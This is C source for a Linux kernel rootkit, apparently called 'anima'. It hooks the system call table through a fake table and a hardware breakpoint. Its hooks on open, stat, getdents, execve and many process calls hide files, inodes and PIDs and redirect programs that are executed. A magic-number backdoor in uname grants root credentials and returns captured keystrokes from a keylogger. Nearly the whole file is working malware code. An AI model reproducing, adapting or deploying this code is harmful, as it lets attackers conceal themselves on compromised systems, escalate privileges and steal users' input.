#include <asm/segment.h>
#include <asm/ptrace.h>
#include <asm/unistd.h>
#include <asm/siginfo.h>

#include <linux/kernel.h>
#include <linux/perf_event.h>

#include <anima/arch.h>
#include <anima/config.h>
#include <anima/debug.h>
#include <anima/hide_file.h>
#include <anima/hide_task.h>
#include <anima/keylogger.h>
#include <anima/ksyms.h>
#include <anima/libc.h>
#include <anima/uaccess.h>
#include <anima/structs.h>
#include <anima/syscalls.h>
#include <anima/anima_ctl.h>
#include <anima/vfs.h>

#define HOOK(sys, func)	\
		do {	\
			fake_sct[__NR_##sys] = (unsigned long)func;	\
		} while (0)

static unsigned long fake_sct[NR_SYSCALLS];

/*
 * FIXME: new algo for better performance
 */
/******************************************************************************
 * filesystem syscalls with path argument
 *
 * open, stat, lstat, access, execve, truncate, getdents, chdir, rename,
 * mkdir, rmdir, creat, link, unlink, symlink, readlink, chmod, chown, utime
 * mknod, statfs, chroot, mount, umount, *xattr, getdents64, utimes, and
 * much more
 *****************************************************************************/
asmlinkage long new_sys_chdir(char *path)
{
	long ret;
	struct stat st;

	SET_KERNEL_DS;
	ret = ksyms.old_sys_stat(path, &st);
	SET_OLD_FS;
	if (ret)
		return ret;

	if (is_inode_hidden(st.st_ino)) {
		pr_debug("%s: hiding inode %lu\n", __func__, st.st_ino);
		return -ENOENT;
	}


	return ksyms.old_sys_chdir(path);
}

asmlinkage long new_sys_stat(char *path, struct stat *st)
{
	long ret;
	struct stat tmp_st;

	SET_KERNEL_DS;
	ret = ksyms.old_sys_stat(path, &tmp_st);
	SET_OLD_FS;
	if (ret)
		return ret;

	if (is_inode_hidden(tmp_st.st_ino)) {
		pr_debug("%s: hiding inode %lu\n", __func__, tmp_st.st_ino);
		return -ENOENT;
	}
	if (ksyms._copy_to_user(st, &tmp_st, sizeof(*st)))
		pr_debug("%s: _copy_to_user failed\n", __func__);

	return ret;
}

asmlinkage long new_sys_lstat(char *path, struct stat *st)
{
	long ret;
	struct stat tmp_st;

	SET_KERNEL_DS;
	ret = ksyms.old_sys_lstat(path, &tmp_st);
	SET_OLD_FS;
	if (ret)
		return ret;

	if (is_inode_hidden(tmp_st.st_ino)) {
		pr_debug("%s: hiding inode %lu\n", __func__, tmp_st.st_ino);
		return -ENOENT;
	}
	if (ksyms._copy_to_user(st, &tmp_st, sizeof(*st)))
		pr_debug("%s: _copy_to_user failed\n", __func__);

	return ret;
}

#if ARCH_X86
asmlinkage long new_sys_fstatat(int fd, char *path, struct stat *st, int flag)
{
	long ret;
	struct stat tmp_st;

	SET_KERNEL_DS;
	ret = ksyms.old_sys_fstatat(fd, path, &tmp_st, flag);
	SET_OLD_FS;
	if (ret)
		return ret;

	if (is_inode_hidden(tmp_st.st_ino)) {
		pr_debug("%s: hiding inode %lu\n", __func__, tmp_st.st_ino);
		return -ENOENT;
	}
	if (ksyms._copy_to_user(st, &tmp_st, sizeof(*st)))
		pr_debug("%s: _copy_to_user failed\n", __func__);

	return ret;
}
#endif

asmlinkage long new_sys_open(char *filename, int flags, umode_t mode)
{
	long ret;
	char *old_path, *new_path;
	struct stat st;

	if ((mode & 0xfffffffe) != 0) {
		/* ! O_RDONLY */
		goto out;
	}

	old_path = anima_strndup_from_user(filename, MAX_PATH_LEN);
	if (!old_path)
		goto out;

	SET_KERNEL_DS;
	ret = ksyms.old_sys_stat(filename, &st);
	SET_OLD_FS;
	if (!ret && is_inode_hidden(st.st_ino))
		return -ENOENT;


	new_path = get_redirect_path(old_path, REDIRECT_PATH_OPEN);
	if (new_path) {
		pr_debug("%s: redirect %s to %s\n", __func__, old_path, new_path);
		SET_KERNEL_DS;
		ret = ksyms.old_sys_open(new_path, flags, mode);
		SET_OLD_FS;
		return ret;
	}
	anima_vfree(old_path);
out:
	return ksyms.old_sys_open(filename, flags, mode);
}

asmlinkage long new_sys_getdents(unsigned int fd, struct linux_dirent *dirp, unsigned int count)
{
	long ret;
	unsigned long r;

	ret = ksyms.old_sys_getdents(fd, dirp, count);
	if (ret <= 0)
		return ret;

	for (int pos = 0; pos < ret; ) {
		unsigned long d_ino;
		unsigned short d_reclen;
		char *ptr = (char *)dirp + pos;
		struct linux_dirent *d = (struct linux_dirent *)ptr;

		if (ksyms._copy_from_user(&d_ino, &d->d_ino, sizeof(d_ino)))
			return -EFAULT;
		if (ksyms._copy_from_user(&d_reclen, &d->d_reclen, sizeof(d_reclen)))
			return -EFAULT;

		if (is_inode_hidden(d_ino)) {
			r = ksyms._copy_to_user(d, (char *)d + d_reclen, ret - pos - d_reclen);
			if (r) {
				pr_debug("%s: _copy_to_user\n", __func__);
				return -EFAULT;
			} else {
				ret -= d_reclen;
			}
		} else {
			pos += d_reclen;
		}
	}

	return ret;
}

asmlinkage long new_sys_getdents64(unsigned int fd, struct linux_dirent64 *dirp, unsigned int count)
{
	long ret;
	unsigned long r;

	ret = ksyms.old_sys_getdents64(fd, dirp, count);
	if (ret <= 0)
		return ret;

	for (int pos = 0; pos < ret; ) {
		unsigned long d_ino;
		unsigned short d_reclen;
		char *ptr = (char *)dirp + pos;
		struct linux_dirent64 *d = (struct linux_dirent64 *)ptr;

		if (ksyms._copy_from_user(&d_ino, &d->d_ino, sizeof(d_ino)))
			return -EFAULT;
		if (ksyms._copy_from_user(&d_reclen, &d->d_reclen, sizeof(d_reclen)))
			return -EFAULT;

		if (is_inode_hidden(d_ino)) {
			r = ksyms._copy_to_user(d, (char *)d + d_reclen, ret - pos - d_reclen);
			if (r) {
				pr_debug("%s: _copy_to_user\n", __func__);
				return -EFAULT;
			} else {
				ret -= d_reclen;
			}
		} else {
			pos += d_reclen;
		}
	}

	return ret;
}

asmlinkage long
new_sys_execve(const char *__filename, const char **argv, const char **envp)
{
	int r;
	char *old_path, *new_path;
	char *filename = (char *)__filename;

	old_path = anima_strndup_from_user(filename, MAX_PATH_LEN);
	if (!old_path)
		goto out;

	new_path = get_redirect_path((char *)old_path, REDIRECT_PATH_EXECVE);
	if (new_path) {
		unsigned int new_path_len = anima_strlen(new_path);
		int path_len_delta = (int)new_path_len - (int)anima_strlen(old_path);

		pr_debug("%s: redirect %s to %s\n", __func__, old_path, new_path);

		if (path_len_delta < 0)
			path_len_delta = 0;
		filename -= path_len_delta;

		/* FIXME: check if we are overwriting argv or envp */
#if ARCH_X86
		cr0_wp_enter();
#endif
		r = ksyms._copy_to_user(filename, new_path, new_path_len+1);
#if ARCH_X86
		cr0_wp_exit();
#endif
		if (r) {
			/* restore filename pointer */
			filename += path_len_delta;
		}
	}
	anima_vfree(old_path);
out:
	return ksyms.old_sys_execve(filename, argv, envp);
}

asmlinkage long new_sys_getpgid(pid_t pid)
{
	if (is_pid_hidden(pid))
		return -ESRCH;

	return ksyms.old_sys_getpgid(pid);
}

asmlinkage long new_sys_getsid(pid_t pid)
{
	if (is_pid_hidden(pid))
		return -ESRCH;

	return ksyms.old_sys_getsid(pid);
}

asmlinkage long new_sys_setpgid(pid_t pid, pid_t pgid)
{
	if (is_pid_hidden(pid))
		return -ESRCH;

	return ksyms.old_sys_setpgid(pid, pgid);
}

asmlinkage long new_sys_getpriority(int which, int who)
{
	if (is_pid_hidden(who))
		return -ESRCH;

	return ksyms.old_sys_getpriority(which, who);
}

asmlinkage long new_sys_kill(pid_t pid, int sig)
{
	if (is_pid_hidden(pid))
		return -ESRCH;

	return ksyms.old_sys_kill(pid, sig);
}

asmlinkage long new_sys_sched_setscheduler(pid_t pid, int policy, void *param)
{
	if (is_pid_hidden(pid))
		return -ESRCH;

	return ksyms.old_sys_sched_setscheduler(pid, policy, param);
}

asmlinkage long new_sys_sched_setparam(pid_t pid, void *param)
{
	if (is_pid_hidden(pid))
		return -ESRCH;

	return ksyms.old_sys_sched_setparam(pid, param);
}

asmlinkage long new_sys_sched_getscheduler(pid_t pid)
{
	if (is_pid_hidden(pid))
		return -ESRCH;

	return ksyms.old_sys_sched_getscheduler(pid);
}

asmlinkage long new_sys_sched_getparam(pid_t pid, void *param)
{
	if (is_pid_hidden(pid))
		return -ESRCH;

	return ksyms.old_sys_sched_getparam(pid, param);
}

asmlinkage long new_sys_sched_setaffinity(pid_t pid, unsigned int len,
					unsigned long *user_mask_ptr)
{
	if (is_pid_hidden(pid))
		return -ESRCH;

	return ksyms.old_sys_sched_setaffinity(pid, len, user_mask_ptr);
}

asmlinkage long new_sys_sched_getaffinity(pid_t pid, unsigned int len,
					unsigned long *user_mask_ptr)
{
	if (is_pid_hidden(pid))
		return -ESRCH;

	return ksyms.old_sys_sched_getaffinity(pid, len, user_mask_ptr);
}

asmlinkage long new_sys_sched_rr_get_interval(pid_t pid, void *interval)
{
	if (is_pid_hidden(pid))
		return -ESRCH;

	return ksyms.old_sys_sched_rr_get_interval(pid, interval);
}

asmlinkage long new_sys_wait4(pid_t pid, int *status,
				int options, void *rusage)
{
	if (is_pid_hidden(pid))
		return -ESRCH;

	return ksyms.old_sys_wait4(pid, status, options, rusage);
}

asmlinkage long new_sys_waitid(int which, pid_t pid,
				void *infop,
				int options, void *ru)
{
	if (is_pid_hidden(pid))
		return -ESRCH;

	return ksyms.old_sys_waitid(which, pid, infop, options, ru);
}

asmlinkage long new_sys_rt_tgsigqueueinfo(pid_t tgid, pid_t pid, int sig,
					siginfo_t *uinfo)
{
	if (is_pid_hidden(pid))
		return -ESRCH;

	return ksyms.old_sys_rt_tgsigqueueinfo(tgid, pid, sig, uinfo);
}

asmlinkage long new_sys_rt_sigqueueinfo(int pid, int sig, siginfo_t *uinfo)
{
	if (is_pid_hidden(pid))
		return -ESRCH;

	return ksyms.old_sys_rt_sigqueueinfo(pid, sig, uinfo);
}

asmlinkage long new_sys_prlimit64(pid_t pid, unsigned int resource,
					void *new_rlim, void *old_rlim)
{
	if (is_pid_hidden(pid))
		return -ESRCH;

	return ksyms.old_sys_prlimit64(pid, resource, new_rlim, old_rlim);
}

asmlinkage long new_sys_ptrace(long request, pid_t pid, void *addr, void *data)
{
	if (is_pid_hidden(pid))
		return -ESRCH;

	return ksyms.old_sys_ptrace(request, pid, addr, data);
}

#if ARCH_X86
asmlinkage long new_sys_migrate_pages(pid_t pid, unsigned long maxnode,
					unsigned long *from, unsigned long *to)
{
	if (is_pid_hidden(pid))
		return -ESRCH;

	return ksyms.old_sys_migrate_pages(pid, maxnode, from, to);
}
#endif

asmlinkage long new_sys_move_pages(pid_t pid, unsigned long nr_pages,
				void **pages,
				int *nodes,
				int *status,
				int flags)
{
	if (is_pid_hidden(pid))
		return -ESRCH;

	return ksyms.old_sys_move_pages(pid, nr_pages, pages, nodes, status, flags);
}

asmlinkage long new_sys_get_robust_list(int pid, void **head_ptr, size_t *len_ptr)
{
	if (is_pid_hidden(pid))
		return -ESRCH;

	return ksyms.old_sys_get_robust_list(pid, head_ptr, len_ptr);
}

asmlinkage long new_sys_perf_event_open(
                void *attr_uptr,
                pid_t pid, int cpu, int group_fd, unsigned long flags)
{
	if (is_pid_hidden(pid))
		return -ESRCH;

	return ksyms.old_sys_perf_event_open(attr_uptr, pid, cpu, group_fd, flags);
}

asmlinkage void new_sys_exit(int error_code)
{
	pid_t pid = ksyms.old_sys_getpid();

	if (is_pid_hidden_no_getpid(pid))
		unhide_pid(pid);

	ksyms.old_sys_exit(error_code);
}

asmlinkage void new_sys_exit_group(int error_code)
{
	pid_t pid = ksyms.old_sys_getpid();

	if (is_pid_hidden_no_getpid(pid))
		unhide_pid(pid);

	ksyms.old_sys_exit_group(error_code);
}

asmlinkage long new_sys_reboot(int magic1, int magic2, int cmd, void *arg)
{
	return ksyms.old_sys_reboot(magic1, magic2, cmd, arg);
}

/*
 * rookit interface
 */
asmlinkage long new_sys_newuname(struct new_utsname *name)
{
	struct rk_args args;

	if (ksyms._copy_from_user(&args, name, sizeof(args)))
		pr_debug("%s: _copy_from_user failed\n", __func__);

	if (args.magic_number_1 != MAGIC_NUMBER_1 || args.magic_number_2 != MAGIC_NUMBER_2)
		return ksyms.old_sys_uname(name);

	pr_debug("%s: magic number reveived\n", __func__);

	switch (args.mode) {
	case SYSCALL_HIDE_INODE:
		hide_inode(args.param1);
		break;
	case SYSCALL_UNHIDE_INODE:
		unhide_inode(args.param1);
		break;
	case GET_ROOT:
		if (ksyms.commit_creds && ksyms.prepare_kernel_cred)
			ksyms.commit_creds(ksyms.prepare_kernel_cred(NULL));
		break;
	case SYSCALL_HIDE_PID:
		hide_pid(args.param1);
		break;
	case SYSCALL_UNHIDE_PID:
		unhide_pid(args.param1);
		break;
	case VFS_HIDE_FILE:
		vfs_hide_filename(args.p_param1, args.param2);
		break;
	case VFS_UNHIDE_FILE:
		vfs_unhide_filename(args.p_param1, args.param2);
		break;
	case SYSCALL_REDIRECT_EXECVE:
		redirect_path(args.p_param1, args.param2,
				args.p_param3, args.param4, REDIRECT_PATH_EXECVE);
		break;
	case SYSCALL_UNREDIRECT_EXECVE:
		unredirect_path(args.p_param1, args.param2, REDIRECT_PATH_EXECVE);
		break;
	case SYSCALL_GET_KEYLOGGER_BUF:
		return keylogger_buffer_get(args.p_param1, args.param2);
		break;
#ifdef DEBUG
	case DEBUG_RK:
		debug_rk();
		break;
#endif
	}

	return 0;
}

void system_call_hook(struct pt_regs *regs)
{
#if ARCH_X86
	/*
	 * call *sys_call_table(,%rax,8)
	 */
	unsigned long off = ((unsigned long)fake_sct - ksyms.sys_call_table);
	regs->ax += off / sizeof(unsigned long);
#endif
}

void ia32_system_call_hook(struct pt_regs *regs)
{
	pr_info("intercept call");
}

int hook_sys_call_table(void)
{
	anima_memcpy(fake_sct, (void *)ksyms.sys_call_table, sizeof(fake_sct));

	HOOK(uname, new_sys_newuname);

	/* hide files */
	HOOK(open, new_sys_open);
	HOOK(chdir, new_sys_chdir);
	HOOK(stat, new_sys_stat);
	HOOK(lstat, new_sys_lstat);
	//HOOK(newfstatat, new_sys_fstatat);
	HOOK(getdents, new_sys_getdents);
	HOOK(getdents64, new_sys_getdents64);
	HOOK(execve, new_sys_execve);

	/* hide process */
	HOOK(getpgid, new_sys_getpgid);
	HOOK(getsid, new_sys_getsid);
	HOOK(setpgid, new_sys_setpgid);
	HOOK(getpriority, new_sys_getpriority);
	HOOK(kill, new_sys_kill);
	HOOK(sched_setscheduler, new_sys_sched_setscheduler);
	HOOK(sched_setparam, new_sys_sched_setparam);
	HOOK(sched_getscheduler, new_sys_sched_getscheduler);
	HOOK(sched_getparam, new_sys_sched_getparam);
	HOOK(sched_setaffinity, new_sys_sched_setaffinity);
	HOOK(sched_getaffinity, new_sys_sched_getaffinity);
	HOOK(sched_rr_get_interval, new_sys_sched_rr_get_interval);
	HOOK(wait4, new_sys_wait4);
	HOOK(waitid, new_sys_waitid);
	HOOK(rt_tgsigqueueinfo, new_sys_rt_tgsigqueueinfo);
	HOOK(rt_sigqueueinfo, new_sys_rt_sigqueueinfo);
	HOOK(prlimit64, new_sys_prlimit64);
	HOOK(ptrace, new_sys_ptrace);
#if ARCH_X86
	HOOK(migrate_pages, new_sys_migrate_pages);
#endif
	HOOK(move_pages, new_sys_move_pages);
	HOOK(get_robust_list, new_sys_get_robust_list);
	HOOK(perf_event_open, new_sys_perf_event_open);
	HOOK(exit, new_sys_exit);
	HOOK(exit_group, new_sys_exit_group);

	HOOK(reboot, new_sys_reboot);

	/* architecture specific */
#if ARCH_X86
	x86_hw_breakpoint_register(0, ksyms.sys_call_table_call,
					DR_RW_EXECUTE, 0, system_call_hook);
#elif ARCH_ARM
#endif

	return 0;
}
